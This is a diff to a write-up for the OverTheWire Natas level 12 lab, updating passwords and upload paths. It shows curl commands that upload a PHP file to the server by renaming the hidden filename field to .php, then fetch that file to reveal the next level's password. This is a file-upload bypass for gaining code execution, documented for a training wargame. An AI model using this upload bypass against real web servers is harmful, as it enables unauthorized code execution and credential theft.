@@ -1,7 +1,7 @@
-### natas12 pswd: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
+### natas12 pswd: EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng
 
 ```bash
-curl  -s  http://natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB@natas12.natas.labs.overthewire.org
+curl  -s  http://natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng@natas12.natas.labs.overthewire.org
 
 <html>
 <body>
@@ -24,7 +24,7 @@ Choose a JPEG to upload (max 1KB):<br/>
 getting the code
 
 ```bash
-curl  -s  http://natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB@natas12.natas.labs.overthewire.org/index-source.html | w3m -dump -T text/html
+curl  -s  http://natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng@natas12.natas.labs.overthewire.org/index-source.html | w3m -dump -T text/html
 
 <html>
 <body>
@@ -196,7 +196,7 @@ cat natas13psw.php
 > **Note**: we also need to change the **hidden filename field** so it ends in *.php* instead of *.jpg*.
 
 ```bash
-curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB \
+curl -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng \
 -F "uploadedfile=@natas13psw.php" \
 -F "filename=natas13psw.php" \
 natas12.natas.labs.overthewire.org/index.php
@@ -205,16 +205,17 @@ natas12.natas.labs.overthewire.org/index.php
 # <body>
 # <h1>natas12</h1>
 # <div id="content">
-# The file <a href="upload/jr3rokqgdr.php">upload/jr3rokqgdr.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+The file <a href="upload/t44fuvvhqp.php">upload/t44fuvvhqp.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
 # </div>
 # </body>
 # </html>
 ```
 
-Now we just have to "view" the uploaded file randomly renamed to `upload/jr3rokqgdr.php` and it will display us the natas13 psw:
+Now we just have to "view" the uploaded file randomly renamed to `upload/t44fuvvhqp.php` and it will display us the natas13 psw:
 
 ```bash
-curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB \
-natas12.natas.labs.overthewire.org/upload/jr3rokqgdr.php 
-# trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+curl -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng \
+natas12.natas.labs.overthewire.org/upload/t44fuvvhqp.php 
+
+# natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k
 ```
